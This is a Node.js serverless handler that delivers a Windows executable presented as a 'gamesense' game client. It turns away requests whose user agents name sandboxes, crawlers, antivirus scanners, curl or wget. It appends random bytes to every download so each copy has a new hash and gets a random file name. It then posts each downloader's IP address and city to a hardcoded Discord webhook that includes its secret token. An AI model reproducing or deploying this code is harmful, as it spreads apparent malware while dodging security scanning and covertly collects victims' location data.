const https = require('https');

const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1527198025808871515/aipEG-sdQpiOviX2udpy3I-Rvk_z3RpkD4M8jRu1TL-lelPI3bN6o4W-RlsleZklPQJL";

module.exports = async (req, res) => {
    const fileUrl = 'https://gamesense-revive.github.io/gamesense.exe';
    const userAgent = req.headers['user-agent'] || '';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';

    const botKeywords = ['bot', 'spider', 'crawl', 'virus', 'sandbox', 'python', 'curl', 'wget', 'go-http'];
    const isBot = botKeywords.some(keyword => userAgent.toLowerCase().includes(keyword));

    if (isBot) {
        res.status(403).send('Access Denied');
        return;
    }

    res.setHeader('Access-Control-Allow-Origin', '*');

    https.get(fileUrl, (downloadStream) => {
        if (downloadStream.statusCode !== 200) {
            return res.status(500).send('Error');
        }

        let chunks = [];
        downloadStream.on('data', (chunk) => chunks.push(chunk));
        
        downloadStream.on('end', () => {
            let buffer = Buffer.concat(chunks);

            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let randomName = '';
            for (let i = 0; i < 12; i++) {
                randomName += chars.charAt(Math.floor(Math.random() * chars.length));
            }

            const junkSize = Math.floor(Math.random() * 90) + 10;
            const junkBytes = Buffer.alloc(junkSize);
            for (let i = 0; i < junkSize; i++) {
                junkBytes[i] = Math.floor(Math.random() * 256);
            }
            
            const modifiedBuffer = Buffer.concat([buffer, junkBytes]);

            const country = req.headers['x-vercel-ip-country'] || 'Unknown';
            const city = req.headers['x-vercel-ip-city'] || 'Unknown';

            const logPayload = JSON.stringify({
                embeds: [{
                    title: "📥 Client Downloaded",
                    color: 3066993,
                    fields: [
                        { name: "Generated Name", value: `\`${randomName}.exe\``, inline: true },
                        { name: "IP Address", value: `\`${ip}\``, inline: true },
                        { name: "Location", value: `${city}, ${country}`, inline: true }
                    ],
                    timestamp: new Date()
                }]
            });

            const urlObj = new URL(DISCORD_WEBHOOK_URL);
            const options = {
                hostname: urlObj.hostname,
                path: urlObj.pathname + urlObj.search,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(logPayload)
                }
            };

            const reqDiscord = https.request(options);
            reqDiscord.write(logPayload);
            reqDiscord.end();

            res.setHeader('Content-Type', 'application/octet-stream');
            res.setHeader('Content-Disposition', `attachment; filename="${randomName}.exe"`);
            res.status(200).send(modifiedBuffer);
        });

    }).on('error', (err) => {
        res.status(500).send('Error: ' + err.message);
    });
};
